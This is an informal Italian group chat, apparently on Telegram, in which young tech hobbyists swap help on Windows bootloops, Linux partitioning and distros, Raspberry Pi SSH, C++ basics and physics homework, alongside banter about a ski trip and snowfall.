Marco non è che potresti fissare il link del canale dei libri?
Spetta sono appena entrato in casa 
Sorry 
Tranquillo
Addirittura bannato
La mano fulminea
Avevo mandato le foto del nuovo s9
Grazie
Vai
Grazie x2
A me non dispiace sinceramente
Non mi sembra super innovativo 🤔
.

🤪
È molto tipo note 8
Io voglio il pixel!
Non può essere troppo innovativo
Non ce la si fa più
O si trova un'idea diversa... O nulla
Meglio nulla a quel punto
Ehilà... Tutto ok...
quelacuno sa se le geeetech (i cloni delle i3) sono buone come stampanti?
Ho un problema con Windows del cazzo
É in bootloop per colpa di un cazzo si aggiornamento, mi esce l'errore che per continuare devo riavviare l'installazione di windows
Ho provato a fare quello che ho trovato su internet ma nada ✖️✖️
Ragazzi ma il rasp 3 regge un film in streaming?
a scatti
la scheda di rete è troppo poco potente
sono come le anet con il frame migliorato in sostanza
Secondo me sbagli te xD
dimmi cosa
Qual era il testo

ma ma ma....allora, dice di trovare la forza peso, una si vuole suicidare e si butta da 46 metri di altezza, se ΔU=25000J quanto pesa in newton la depressa?
25e3/46
cos?
25000/46
allora.....U=mgh contando che Uf-Ui=ΔU e Uf=0 quindi Ui troviamo noi, quindi, 25000=mgh con h=46 e g=9.81 e quindi 25000/(46*9.81) no?
No senza 9.81
why?
Perché lavoro = forza per spostamento e te vuoi la forza
Trovi la sua  massa così poi la ridevi moltiplicare per g se vuoi il peso in N
a....A....c'hai anche ragione però, e niente, sono 10 giorni che non dormo capiscimi 🤦‍♂️
Ora arriva 
 e dice "gli hai detto una formula sbagliata"

meglio L= ∫F*dS con F vettoriale e S vettoriale o pure questa è ancora sbagliata
E a che velocità arriva la tipa a terra? Raggiunge la velocità limite?
nono, direttamente un tachione
Tornio-
Basta con questa fissazione
Te ne devi liberare, CURATI
È più generale, ma quel integrale non è sempre facilmente risolvibile, poi se sei in un campo conservativo puoi fare la differenza di energia e via
No
Perché rimane 1 Mib?

yee, tutti su programmer humor
Nessuno che mi aiuta con il mio bootloop?
Salvata nella galleria e rinviata in un gruppo telegram 25 secondi fa
citata in sincro con te
.
lascialo li, che soffra
No, devo Espandere la partizione
Ci sono andato un pochino prima del qui presente comunista 
In sincro ho detto
ah buono, l'hai preso alla fine? com'è?
Please rega, devo cazzo bloccarli sti aggiornamenti di Windows
Install linux
Fosse mio, è di mio padre...se esce da sto bootloop gli tolgo sta merda
Imparerà ad usare linux
Ti sarà riconoscente
Ti comprerà la macchina
Mi da un errore del cazzo "Impossibile completare l'installazione. Per installare Windows nel computer in uso, riavviare l'installazione"
Un passo alla volta, sta iniziando con il rasp, ci penserò su
Sì sì per ora niente male
Adesso con calma devo prendere ram e ssd.
Poi volendo ho visto che ci sono un paio di mod interessanti da fargli
Te hai in mente nulla?
^
Sono anni che ormai non uso Windows,  no idee sorry
Ma 10 anni fa non era così merdoso
Ce com'è possibile che un fottuto aggiornamento mandi in bootloop le cose
Se riesci a recuperare la licenza al massimo forse puoi provare a reinstallare
Il punto è che windows è talmente radicato nella società che va avanti senza problemi
Era pure peggio
Il problema è che non posso fare nulla, se non usare il cmd
Non puoi estenderla?
Beh magari ti basta. Non ho idea di dove e come salvi la licenza.
Al massimo ti butti una distro a caso su una chiavetta per recuperare dati/file
No, quel cazzo di Mib
Ma? Hai provato così?  Vai sulla partizione a sinistra, fai modifica e la allunghi.
che fastidio ti dà 1 mib? 
NONONFARLOMAI
non ti parte più windows poi
Si
Con quel mega non posso estendere la partizione dedicata a elementary
non capisce più nulla se lo fai, trova tutto spostato di 1 qualcosa e si impalla
Che?
Ma no, ho detto appunto la partizione di sinistra.
Non ho Windows
L'ho eliminato per sbaglio installando arch 🤦‍♂️
Ehhh
beh...non posso cancellare per sbaglio winzoz se l'ho cancellato per sbaglio prima
Ahahahahah
Da sda6 a sda3 Cambia poco no?
massì, un multiplo, normale sbagliarli
ecco
non c'è quella del tipo giusto
Ahahahahah
Meme Lord here
ottimo
Non puoi eliminare Windows per sbaglio se non lo hai mai installato🤷‍♂
Qualcuno sa come mettere in raid due hdd
Si io l'ho fatto, guarda la tua mobo innanzitutto se lo supporta
ecco 
Dopodiché guarda nel caso specifico come fare, qualche impostazione dal bios (io per accedere ho dovuto fare ctrl+f mi pare)
Così?
ecco appunto
Così no?
dimmi che hai il backup dei dati, ti prego
No
Non ho salvato
oddio..ma perchè fate sempre gli esperimenti senza backup preventivo
D
Non ho fatto niente!
🤔non ti funziona il dual boot?
Comunque su quella partizione non ho file
ah ok, allora niente di grave
Allora....ti spiego tutta la storia
Avevi fatto il dual con elementary, poi volevo installare anche arch e per sbaglio ho eliminato Windows
Fine
Adesso però voglio aumentare la partizione di elementary Di 50gb
Cazzo, rip
Eh, ormai è andata, non posso piangere sul latte versato
Eh purtroppo
Però potrebbe essere l'occasione per passare a Linux una volta per tutte
l'unica cosa da fare è piallare il disco e rifare partizione, dual boot e installazione di Elementary e Windows ex-novo
oppure direttamente Elementary con tutto il disco dedicato
Problema numero 2.......non riesci più a fare l'installazione di Windows
Hahahahh già
Usavi spesso Windows?
Cioè, sentirai la mancanza di Windows?
E mettiamo caso che non voglio più Windows?
Avevo appena messo il dual
come mai? neanche se formatti tutto il disco e cancelli anche Linux?
Forse solo per giocare
Ah, cazzo
Non mi dire così 
eh ho capito, ma se non ti parte il ripristino neanche dalla modalità provvisoria non hai altra via se vuoi Windows
Ehhh, ormai è andata, ricordati della mia sfiga se farai il dual
Hahahahhah e dire che ci stavo pensando
E se non lo voglio?
Lessi un po' dei tuoi messaggi proprio su Elementary e mi stavo informando
No, ma fallo, io con elementary non ho avuto problemi, con arch.....
se non lo vuoi basta che formatti la partizione dove avevi installato Windows e ciaone
Ecco
Il problema è...
Quel cazzo di mb
Quindi è Arch e la sua installazione che ti ha fregato, giusto?
Lo devo includere nella partizione di elementary?
Più che altro mi son confuso io
Però con elementary non ho avuto problemi
Vai tranquillo
onestamente non ti daprei dire, io uso Fedora e fa tutto in automatico..mai usato Elementary
Non è elementary il problema, ma aumentare la partizione di elementary
La vera domanda è.....perché mi caccio in questo guai?
secondo me ti stai complicando la vita inutilmente..hai una chiavetta bootabile con elementary? formatti il disco e lo reinstalli nuovamente a partizione piena, e fine
Ma così mi tocca reinstallare tutto 
eh ho capito, ma se non funziona ugualmente non hai altre vie
 dici che una vm con fortinite mi regge?
Non mi dire così 
Ma porco giuda
Ci sei?
ok non te lo dico
Così è anche peggio 
Conosci la migliore soluzione?
hai chiesto aiuto a Cicca?
Nope
non ti saprei proprio dire onestamente, non ho mai usato quella distro..a parte il formattone non mi viene in mente altro
Grazie comunque 
figurati
Per adesso l'unica mancanza che sento è lo spazio (sempre errore mio che risolverò), i giochi (in realtà giocavo solo a fortinite e a lol, ma se riesco metto tutto su vm), world (si, un po' mi manca, però ieri ho fatto i compiti per la prima volta solo con libre) e i driver della stampante (che ho trovato, ma sempre perché sono stupido non sono riuscito a installare)
Se non hai mai usato Linux inizia con una vm con Ubuntu o se ne sai già un po' su Debian, poi se vedi che è un po' lenta fai una live e provi, non è la stessa cosa però è un inizio
Il fatto è che Windows è, come per il caso dei driver della stampante, supportata in primis da tutto e tutti
È estremamente user-friendly, dai
Stronzate
Credimi
Si, senza dubbio
Il problema è che ora come ora, ho un portatile abbastanza lento e in vm è un mezzo suicidio
Ho provato backbox, girava abbastanza bene
Ma i problemi dei driver potresti trovarlo se ti vai a cercare cose complicate, se invece vai di Ubuntu o Debian stai tranquillo, credimi
Nel senso, non c'era un gran problema
Processore? Scheda video integrata?
E stavo appunto pensando al dualboot
Lasciamo perdere.. Celeron..
Dimmi che non stavi pensando a Kali, parrot o backbox
Sono nel lungo travaglio del "accumulare soldi per costruirne uno"
Cancella quello che ho detto prima
Ah
Budget?
Mi sento offeso
Assolutamente no hahhaha
Ahahahahah
Mi interessa Debian ma non l'ho mai provato con mano, quindi non so
Tu mi hai detto che hai provato backbox in vm e ho fatto 2+2
KDE o gnome?
Vorrei arrivare intorno ai 600
Sei sicuro?
Magari risparmiando sulla scheda video, dato che non è una mia grandissima passione il gaming
Sempre da provare ma tutti parlano bene di gnome
Non so cosa aspettarmi, però
Sennò una proprio l'integrata e risparmi, poi magari la metti
Sono gusti
Esattamente
Però adesso su questo non ti conviene, devi metter equakcosa di leggero
Contando il mercato delle schede video ora, devo starne un po' alla larga hahhaha
Mh tipo? Cosa consigli?
Comunque secondo me è una cattiva idea una build da 600, soprattutto se inesperto, devi fare attenzione a molte cose, potresti trovare problemi, non hai una garanzia come un portatile
Idem ram
Non puoi eliminare Windows se spacchi il pc GesùSignore le bestemmie all'una di notte
Fatti un giro, ci sono distro per vecchi PC
Ubuntu mate se non sbaglio
Sono molto vicino
Davvero? Non sapevo anche per ram
Mh, devo sempre provare con vm
No, con quel processore no, fai una live e vedi
Sennò magari vedi l'os lento ma il problema è del PC 
Poi ti passa pure la voglia
Hahahhaha
È odioso quando si hanno questi problemi
Ci si sente limitati hahhaha
In alcuni momenti si è limitati ahahahahah
So che può sembrare inopportuno ma
Arch, l'hai provato?
Com'è?
Consiglio per utenti che già hanno smanettato in ambito Linux
Non ho avuto l'occasione
Arch è totalmente personalizzabile, a installazione pulita non hai nemmeno un desktop environment
No, per utenti con Esperienza
Ah rip, la mia esperienza finisce qui
Quindi puoi adattarlo ad ogni esigenza
Il problema è "solo" l'installazione
Anche perché quando lo installi appunto non hai tutto 'pronto'
Mh, di conseguenza si devono avere più che discrete conoscenze in materia
Ma prima lo devi installare
Eh ma l'installazione non finisce mai, ci sarà sempre un giorno in cui farai una modifica
E qui ci si collega al tuo "problema"
Il mio problema è che sono scemo 
Si te installi prima arch, che inizialmente è solo il cuore pulsante poi ci aggiungi ciò che ti serve, de e altri programmi
Ah, secondo consiglio spassionato....... Non fidarti troppo dei tutorial, perché poi fai la mia fine
Una parola 
Se facessimo una retta di user-friendibilità, passatemi il termine, Windows e Arch sarebbero stati gli antipodi
Più o meno
Ma dai hahahha, alla fine un errore è stato commesso
Un errore che mi sta costando tantissime bestemmie
La mia prima installazione è durata giorni, più che altro per capire tutte le cose per bene
Il bello dell'informatica❤️
Poi un bel formattone e ho installato manjaro
No, il bello è quando riesci a studiare la dalla nel sistema e ad usarla a tuo vantaggio
Ti capisco
Non è male manjaro
È basato su arch giusto?
No affatto, mi sto trovando parecchio bene
Eh già hahhaha
Chi ha detto il contrario?
Io ho provato anche parrot home
Si, solo che lo installi in 20 minuti e puoi già usarlo
Capito male io. 
 per farti capire.......una volta che dai sudo apt update && upgrade puoi già iniziare a installere tutto, io per primo tool ho installato Spotify 
Un giorno riuscirò a mettere arch.......
Ma non è questo il giorno
Figo hahahhaha
Per ora, Linux è un mondo tutto da esplorare
Idem
Dato che non ho per nulla esperienza
Da come ne parlate voi
È tutto fighissimo hahahhaha
Diciamo che il nuovo è sempre bello ahahahah
Esatto hahhaha
Poi magari ti scocci e decidi di tornare a Windows eh
Diciamo che da Linux smanetti di più
Sisi, è tutto da provare
Questo mi affascina
Perfetto......devo trovare dove mettere 50,56 GB
Ovvero l'essere "padrone" a 360°
Esatto
Rip
Sarò un folle, ma sto cercando di convertire mio padre a Linux 
Ma io vado tranquillo visto che ho comprato un hdd da 2TB
Hahahhaha
Padre smanettone?
a 46 si può ancora imparare molto dai 
Relativamente, diciamo che è oltre la media in informatica
Conta che se c'è una passione di base, mai dire mai
Te quanti anni hai?
E allora vai liscio
Relativamente giovane, quindicenne
Quest'anno 16?
Esattamente
Ci passiamo un anno
Puoi farcela
Hahahhaha
Comunque ci sono alcuni indirizzo informatico che non sanno nenache cos'è Linux
Quindi vai tranquillo
Ma si.. Conta che in alcuni ambiti, non è neanche espressamente richiesta la conoscenza di essi
Te a cosa punti? Semplice conoscenza di Linux o ti piace qualcosa in particolare?
Aspetta, stiamo parlando in una casistica, da adulti o nel quotidiano?
No, dico se tipo ti piace la sicurezza, programmazione, smanettare
Mh
È una domanda che spesso anch'io mi pongo
Se dovessi rispondere
Sono troppo affascinato dalla sicurezza
Idem
E di conseguenza non posso non avere la passione per la programmazione
Sai programmare in py giusto?
Circa, si, sto imparando
Allora se sei interessato alla sicurezza devi leggere il libro di Stefano Novelli
Conosco conosco
Non ti dice molto, anzi.....poco e niente
Letto?
No, semplicemente perché devo prima bene inquadrare il so
Devo avere prima le idee chiare per capire dove sta mettendo le mani
Vabbè, nel libro inizialmente spiega l'anonimo, quindi Mac adddress, ip pubblico e locale, tor, VPN e proxy
Nel senso, ho visto suoi videocorsi ed è molto diretto, nel senso, non spiega il passaggio in sè, bensì punta al risultato
Ed è così infatti
Diciamo che queste cose rientrano un po' nella cultura informatica basilare, dai
Per questo dico
"basilare"
È un metodo completamente opinabile.. Io apprezzo molto il suo lavoro, apprezzo molto il forum e tutto l'impegno che ci sta dietro
Difatti mi ritengo io ancora non pronto per un suo libro
Io ho ormai l'ho fatto
Cosa ne pensi?
E se posso darti un consiglio.....leggi una prima parte, fino a quando si parla di sicurezza, poi chiudi e continua su Linux
Infarinatura generale
Ecco
È come dire sono stato promosso dopo essere andato a scuola, ma alla persona che no capisce devi spiegare come studiare
Però è anche vero che ci sono cose che devi fare a pappagallo
Ed è questo che Stefano non fa', spiegare come fare, spiegare il meccanismo che c'è dietro
Ma non sempre c'è il perché
Insomma dai, un motivo solitamente c'è
Ti spiego cosa voglio dire.....in matematica inizialmente il prof ti spiega la formula e tu la ripeti a pappagallo, poi ti può dire il perché
Nel senso, ricordo vagamente che lui disse "Ora cambieremo l'indirizzo MAC"
(tratto da una storia vera)
E scrisse righe di codice
Righe no
Senza effettivamente spiegarne il senso
Non si dice codice, ma si dice che diede dei comandi
Comandi*, sorry hahaha
Prendi appunti 
Dal terminale comunque, diede comandi
Senza dire almeno a cosa servissero
Se guardi solo i video non capisci un cazzo, più che altro lo mostra
Cioè, ad esempio, se fa sudo apt upgrade
Chi vede il video, cosa ne può sapere?
Deve prima avere una conoscenza alle spalle
Lo spiega nel libro
Tu sai cosa significa?
Non l'ho letto hahahah
Per questo sto dicendo che ti conviene leggerlo fino alle vpn e basta
So a cosa serve per infarinatura generale, probabilmente pure sbaglio
Giusto per l'anonimato
Si, scusami hahahah
Io sono del parere che sbagliare è giusto
Io ho iniziato con Kali perché in quel momento mi sembrava la cosa migliore con cui iniziare, però sono stato criticato su questo, ed è normale, però una volta che ho notato l'errore mi sono messo in "regola"
Ti ho già raccontato di backbox
Che poi.....perché con backbox te?
Comunque si, assolutamente, in qualsiasi campo delle vita
Girando su internet, misero un po' la voce di backbox, un progetto italiano ecc
Poi contemporaneamente overvolt lo usava e mi trovai praticamente ad utilizzare backbox
Io non userò MAI PIÙ Kali, però per parrot...
Hahhahahahahahhahaha
Parrot mi piace un sacco, poi ho il vantaggio del gruppo Italiano
Dai, il bello di sbagliare è che poi ci si ride sui propri errori
In che senso gruppo italiano?
Ma infatti! O bestemmiare come quello su Windows 
Team italiano
Ahh ok
Almeno la prossima volta non rifarai lo stesso errore hahahah
Il problema è che se tu dici parrot su Linux Italia ti uccidono! Ma la maggior parte nenache è a conoscenza che esiste anche la home
Non credo ci sarà una prossima volta con arch 
Il fatto è che generalmente, chi sa più di te, tende a credersi dio, senza effettivamente dare consigli per migliorare l'altro
Quindi, spesso è tutto un self made
Verissimo
E alla fine non impari niente
Ecco
Approfondimento della serata: sei a conoscenza di RedStar OS?
Si
E la cosa inquieta e non poco hahahaha
Mi sono informato un po' su tutta la Corea del Nord
E questo non voler nemmeno avere contatti telematici esterni
È inquietante, ma fa parte della gabbia in cui sono intrappolati
Un po' come 1984, di Orwell
Da notare che comunque sono posizionati bene come avanzamento tecnologico
Sisi
Pensa che gli studenti, maggiormente, si specializzano proprio in questo campo
 le cose che più mi piacciono di Linux 
Hai personalizzato il terminale in modo che all'apertura ti appaia ciò? Hahahahahahah
Si
Figata hahahahahah
Mi dice temperatura, ip, e tutti quello che vedi 
Sai di cos'è il risultato quello?
Ip pubblico non è il top della sicurezza hahahah
Così tengo "tutto sotto controllo"

Comunque un'altra cosa carina è il rasp
Approposito
In alto a sx
Leggo Raspberry
Why?
Collegamento via ssh
Dipende dal PC. Ma non c'è su wine/playonlinux?
Mh, tanta roba
Ne avevo già sentito parlare di playonlinux
Tantissima
Comunque ti saluto, io vado
Notte
Notte
Quando serve qualcosa chiedi sul gruppo 
Quant'è figa st'emoji hahahah
Ci sono persone molto più esperte di me
Ahahahah
Ma anche di me, non preoccuparti hahahha
Notte
Per te dovrei formattare? 
Tanto quando si passerà compiutamente a IPv6 (se si farà) non ci saranno più indirizzo privati
SE
Non so non ho seguito il discorso
Il problema della partizione
Devo aumentare elementary
beh ormai è supportato quasi ovunque. Con il passare del tempo forse si farà
Ancora non mi hai risposto se ti serve l' hacker Journal 
Vediamo se il formattone delle 2 A.M. ha funzionato
Ah mi è venuta in mente una cosa. Forse non ti lascia modificare la partizione di cui stai lavorando
Sono su live 
Ah lol
Comunque ci ero più o meno riuscito
Mmm quale?
Questo mese e quello di gennaio
Se vuoi ho anche Linux  pro
È ricominciato? Mmm potrebbe essere nice
Nah questo no
Raga
Tra 4 ore devo partire per il trentino e non ho ancora fatto la mia valigia
Lo è
Helpatemi col dirmi cosa ci dovrei mettere dentro pls 
Ma si scem?
Nop ahahah
La camera
Intendi la actioncam cinesissima? Quella c'è ovviamente
Adesso vado che mi si stanno chiudendo gli occhi. Magari mandamelo quando hai tempo
Altrimenti come le registro le skill in fuoripista sulle nere
No si sta aggiornando di nuovo.
Intendevo la tua camera, ma anche le action cam vanno bene 
Ho sempre tempo 
non di nuovo, questo è un girone dell'inferno
A proposito di actioncam
Ma che dati facendo?
dove cazzo sta che non la trovo
Ahahahahah
Vestiti tanto pesanti. Nei prossimi giorni in montagna previste -20 minima -12 massima
Dite che i led servano?

Ma che ci devi fare coi led ?!
A cosa
Niente lol
Comunque nel caso
Li prendo, non si sa mai
Ahahahahah
Ma che cazz
Ho sempre dei LED di scorta nel comodino
Ma cosa ci fai con dei led?!
Insieme ai cavi SATA e Ethernet
Questo dovrebbe essere il comodino
Massì tutto il comodino in valigia, non si sa mai
È vuoto
Onesto 
Parlando di roba seria
Che PC porto?
Non ti dimenticare le cuffie!
Ho un'ampia scelta
Il fisso
Ovvio, però porto solo le soundmagic
Le Sennheiser ogni volta che le porto fuori casa si rompono, sempre.
Auricolari?
Sì ma abbastanza buoni, costano 50€
Un paio di sd?
Ne ho una da 64GB
Hdd?
In caso porto un WD MyPassport da 1TB
E tramite il PC sposto la roba lì
Come ti ci trovi?
Che PC porti?
Fa il suo dovere di HDD portatile
Non è ssd?
No
Gli unici due SSD che ho sono uno SATA nel portatile e un NVMe nel fisso
Chiavetta USB con distro Linux?
A quale fine
Non mi metterò ad hackerare il residence
Nel caso in cui tu finisce il wifi lo prendi in prestito

Ahahahahah
Allora sei pronto
Improbabile, il Wi-Fi loro fa cagare, ci sono stato sia l'anno scorso che 2 anni fa, e Wind prende solo in EDGE, manco 3G, ma l'EDGE va meglio di quel Wi-Fi.
Ma stai in montagna, goditi il paesaggio
Devo ancora decidere quale PC, prendere i powerbank, gli alimentatori, ciabatta/multipresa, speaker Bluetooth per i festini in camera, actioncam, supporti per montare l'actioncam con una clip sulla giacca
C'è un tizio in un gruppo che crede di essere mr. Robot 
Libro da leggere e non so xhe altro
Ma chi
Nel gruppo inforge
No eBook?
Ma quanti PC hai?
No la mia prof dice che non vanno bene
Miei? 2+1, quell'uno non era mio ma ora l'ho formattato e ci è diventato
La madonna
In totale (non miei ma a cui ho accesso) 4-5
Insomma + il portatile di mio padre e + il suo fisso in ufficio
Un cavalletto per l'action?
Che ci devo fare
Devo registrare mentre scio
E alla fine lo lasci vicino la finestra
Magari esce fuori qualcosa di figo
Ok con un'incursione nella stanza dei miei ho recuperato il mio terzo PC (quello reso mio, era di mia madre ma l'ha usato una volta sola in 3 anni)
Ti lascio alle tue valigie
E ora, quale porto? Padre o figlio?
Buona notte e buon divertimento 
Notte
Padre tutta la vita
Non lo so, mi sa che non entra
Vabbuò dai porto quello piccolo (che tra l'altro è un transformer, non un portatile)
Perfetto, non posso mandare GIF
Il menu a lato di Telegram desktop e poi impostazioni
ouu maaa god....qua nevica
yup
voglio guardarla al microscopio
10 minuti che si raffredda il cucchiaio
maccos
ecco, io con il microscopio dovrei riuscire a vederne i piccoli spigoli, voglio provarci
Ma si vede proprio come nella foto??
Ee this is nevaaa, a 200x
ma no hahahaha ho preso la prima che ho trovato con 
uhmmm
Peccato :(
Questo credo abbia moolti meno ingrandimenti comunque
Puf
Se vuoi rivedere quella struttura credo serva per forza un microscopio elettronico, è una microstruttura infondo
Cmq la forma dei fiocchi che stanno cadendo è tipo il logo di redstar os
🤨
O.o
yeeep
beh si anche l'abito cristallino, ma è anche una struttura che si ripete nel moolto piccolo, e non solo come cella fondamentale, è una delle caratteristiche del ghiaccio/nevaaah
almeno, io seguo interesting as fuck
e poi ho fatto verifica giusto la settimana scorsa su questo argomento
Aaaaaa
Io sto nel gruppo dei traduttori
Si ma ad un qualsiasi ottico la vedi la struttura 
giààà....per questo mi sembra strano, comunque credo sia perchè si stava già sciogliendo e quindi era trasparente nelle mie foto, altrimenti non me lo spiego🤔
Buongiorno ragazzi
Raga per usare SSH con il Raspy, il Raspy deve essere connesso al wifi giusto ?
alla stessa rete
Sì ok
Ma se non ho possibilità di controllo tramite Ethernet  come faccio  a Collegarlo  alla wifi
in che senso
Voglio collegarmi al Raspy tramite SSH ma ci vuole internet... 
Io non posso collegare il Raspy a internet tramite Ethernet e quindi devo farlo tramite wifi, che faccio?
Attaccalo ad uno schermo e una tastiera e collegalo al wifi
Non hai altre alternative
Allora non posso farlo
Va bene fa niente grazie comunque 
Avete mai provato a "riparare" i graffi su cellulari/schermi con il dentifricio?
Ma che ca
Perché non dovrebbe lasciarti tonnellate di aloni sullo schermo? xD
ragazzi. ho notato che i android calcolano male il sin,cos. why?
non so se hanno aggiustato,ma un sacco di cel non sanno fare
Devi fare sin(angolo/180*π)
Perché windows >>>>
ora provo
non funziona lo stesso,sin(30) da 0.05 lol
attaccalo direttamente al pc con il cavo eth dovrebbe andare
cmq non vedo il senso di fare cosi..ma vabe

però prima devi abilitare l'ssh
a lol io avevo capito un po male  cmq grz e.. perchè non sin(30) ma cosi?
Perché devi trasformarlo in radianti
a mo lol vabene non ci avevo pensato,cmq grazie
raga,ma che diffrenza cè tra prefix e postfix? cioe, i(10); i--; --i; ?? ho notato che l'output da in diverso modo e la cosa che non capisco è il senso della differenza tra prefix e postifix.c++
se fai —i ti esce i-1 mentre con i— ti esce i e poi gli toglie 1 come operazione
Ora lo cerco
cos'è sta magggia che è avvenuta?
Bohhhhhhh
Ragazzi qualcuno che è riuscito a fare andare i sonoff del video" Domotica la guida definitiva? "
Non appare finalstage
quando dimentichi fuori il powerbank e ti ritrovi i fiocchi singoli bellixxximiii
ahh quindi se faccio i(0); while(1){++i cout « i } il output va dal 1 non 0?
cosa c'entra?
e tra l'altro cosa significa
non cambia niente in quel caso, quando fai ++i; o i++; non cambia niente, se fai i=5; cout«" i : "«i++; esce "i : 5" se fai cout«" i : "«++i; esce "i : 6" essenzialmente, quella è la differenza, con ++i prima somma 1 e dopo fa il resto, con i++ prima esce e poi gli aggiunge 1
ok,ora ho capito ,grazie :3
Let me 
 that for you:
 

Escono le lineage 15.1 official 
Controllate se il vostro telefono sarà tra  quelli che le ricevono domani
L'ho già ricevuto 
Ma se le build iniziano stanotte 
Pensavo fosse Oreo normale 
Nono lineage
Finalmente official 
Il mio non c'è 
Però secondo me arriva tra un paio di giorni al massimo
Nup settimana prossima in caso... Le build sono di lunedì
Vabbè ma io aspetto ancora le patch di febbraio 🤦‍♂️
Che telefono? Uno xiaomi qualcosa giusto?
Mi A1
 ti ho mandato l'hacker Journal in privato, non segnalarmi 
Ah ecco..
In bocca al lupo allora 

Perché? 
Beh... Il supporto a xiaomi è un po' meh
Q parte il mi5
Se non vi scoccia ripropongo il quesito di ieri perchè non avevo info migliori..
Dovrei capire come riuscire a riordinare il Boot nel mio pc, ho due partizioni (win10 e ubuntu gnome). 
Se accendo e non entro nel bios parte windows, se voglio far partire devo premere ESC, F9 e selezionare Ubuntu. 
Allego le immagini.

Qualcuno mi saprebbe dire come invertire le cose e far in modo che si avvii ubuntu prima?
Nel Bios, su boot order, mi appare questo

Non c'è ubuntu
Devi smanettare un po', qualcuno c'era riuscito ma non ricordo come
Perché praticamente con uefi il grub viene tolto quando avvii Windows
Cerca qualche guida o chiedi su irc
Da Ubuntu installa grub customizer è cambia l'ordine su grub
Okok, premessa: non studio informatica Pero mi piace imparare..

A smanettare, per quanto possibile, ci ho provato ma non ho risolto..
irc..cos'è?
Ok, potrebbe essere una soluzione ci provo e ti aggiorno
Una specie di telegram primitivo, lì c'è il supporto in italiano di Ubuntu, gente preparata
La neve  Ieri ho pranzato in giardino da quanto faceva caldo, e oggi... 
Ah interessante non lo conoscevo grazie! Cerco su google e vedo cosa trovo a riguardo:)
Meglio così, sto venendo dalle vostre parti
Sono a metà strada (Bologna) ed è già tutto bianco
Uhuu dove dove?
Beeeellla 
Marilleva, è vicino Trento
Potresti passare a salutare però 
da notare che ho usato l'app di camerafi e il telefono per scattarla perchè in camera fa troppo caldo
Ah un'altra cosa per me importante se non fondamentale...
Con il portatile ho bisogno di fare spesso l'hotspot con lo smartphone, su Win10 c'è la modalitá "connessione a consumo" che in automatico non mi scarica cose che consumano molto o altre cose che tolgono molti dati. 
C'è qualcosa di simile su Ubuntu? Oppure non fa nulla del genere gia di suo?
Eeeh magari, sai con quanti amici sono?
Siamo tipo 20
E 2 di loro sono del clan di csgo
Si ma io vedo acqua e un cartone ahahah
Beh, se passi per Padova non troverai nulla invece
in realtà quello è un pezzetto del fiocco, probabilmente si era reso trasparente, non so, comunque era praticamente in aria, non c'era nulla sotto, era in verticale
Ma che palle
Comunque la Nissan non ha la Variante Di Valico (il tratto dell'A1 relativamente nuovo) nella mappa
Al sud si sono fottuti pure la neve
Ma cosa
Meglio, in tanti ci si diverte di più 
Bah per quel che serve 
windows usa la connessione a consumo per non farti gli aggiornamenti in automatico
Effettivamente è tutta dritta
Vai a sciare??
Yess
Cos cosa?
ubuntu se disattivi il download degli aggiornamenti in maniera automatica non ti scarica niente, di default dovrebbero essere già disattivati
Mi sono portato pure l'actioncam, così visto che farò tipo tanto fuoripista se muoio gli risparmio le indagini
Cosa intendi dire?
Era una battuta

Ottimo 
Ok, altre cose non dovrebbe scaricare giusto? Cerco su google come disattivarli..
Beh si lo avevo capito... Ma il fatto è che a sud non sta nevicando
anyway sugli Appennini nevica e non poco
ma 
E il mio telefono si sta scaricando nonostante sia in carica WTF
piuttosto fai qualche videozzo da caricare sul tubo
Eh
Giusto per avere la soddisfazione di mettere dislike 
naah
Io sono a favore dei venti siberiani ma fa solo pioggia
Ma chi si guarda dei deficienti che fanno fuoripista che è pure illegale anche se lo fanno pure i maestri di sci a quanto ho visto l'anno scorso
Boys qualcuno mi può aiutare? Ho appena iniziato c++ e volevo chiedere come fare una cosa abbastanza facile, ovvero come fermare il programma nel mezzo di una funzione.
Metti un cin
Dove sei?
Cin
HAHAHAHHAHAHAH se shorti "ciao" con 
 te lo accetta
Per acquisire da tastiera un carattere o un numero
In che senso
Abruzzo... So che è meridione ma solo per questioni che la nostra cassa è quella del mezzogiorno
Ah il cavo era mezzo dentro e mezzo fuori, faceva falso contatto e caricava male
Il programma aspetta a te che gli inserisca un dato
Ahahahahah
 il libro di Renzo perfetti è seconda edizione?
Non devo inserire un dato, devo fermare il programma in caso una variabile sia maggiore di un'altra
Posso scriverti in privata 
 ?
Ora non posso...stare tanto al cell
Ah ok
Ma fermare in che senso?
Comunque volevo fare in modo che se a>b allora fermare il programma
Cioè stopparlo
Insomma eseguire return 0
Un do- while?
E potresti fare così
O se sei in un ciclo un break ad esempio
Dipende dalla tua situazione
Eh è per questo che volevo mandarti il codice in privata
sono 3 righe
Ok manda
AAHAHHAHAHHAHAHA
Perché aggiorni le mappe alle auto?
aspe che lo converto in mp3 che lo legge telegram per cellulari
È a pagamento e a ottobre cambio macchina, ergo non mi interessa farlo
Eh appunto e non costa poco mi sa
ECCOLO
Cioè
ma
mi warna per l'audio
ma per il file no 

cioè, il file potrebbe essere anche un virus
l'audio no 
trojan incoming
mah
anche noh
aah sta mano
lel
comunque è troppo trash 
 si chiama inquinamento 
La neve  Ieri ho pranzato in giardino da quanto faceva caldo, e oggi... 
NO
ahahahahahah
Dai che si legge comunque che sei dell'Abruzzo
Giuro che non si vede di dove sei visto che hai censurato
Ma si vedeva anche la città 
Comune di... 
Pe***ra
MANNAGGIA ALLE FOTO
AHAHAHAHAHAHAHAH
odio facebook
Basta andare sulle pagine Facebook di tutti comuni d'Abruzzo
sempre e comunque

Oh io ho reso pubblico il mio indirizzo di casa e tu non puoi dire di dove sei...
Sattoh
...
rip
Ahahah che poi non hai censurato la seconda foto dove C'è scritto provincia di Pescara, e poi sopra alla firma del sindaco c'è il nome alessandrini quindi chiunque dell'Abruzzo o del centro avrebbe capito

facevo prima a incollare il testo del post ma vabeh
Anche se hai lasciato il nome della regione sei meno sgamabile
Non capisco tutta sta privacyfobia
Alla fine ci conosciamo più o meno tutti e come vedi non siamo malintenzionati
Tanto che io diverse volte ho reso pubblico il mio indirizzo con uno screen senza farci caso
padre direi
Ho portato lo zainetto piccolo con il PC piccolo
Nessuno dei 2
Guarda che non è illegale sciare fuoripista in Italia come non lo è lo scialpinismo
Peccato che c'è un big cartello con scritto "VIETATO IL FUORIPISTA" nel loro comprensorio
è vietato, ma non è illegale, serve perché se vai fuoripista e ti svegli morto i gestori della pista non ti rimborsano
Non è vietato, se fai fuoripista loro non hanno più la responsabilità e in caso tu abbia pagato l'assicurazione con lo skipass non vale
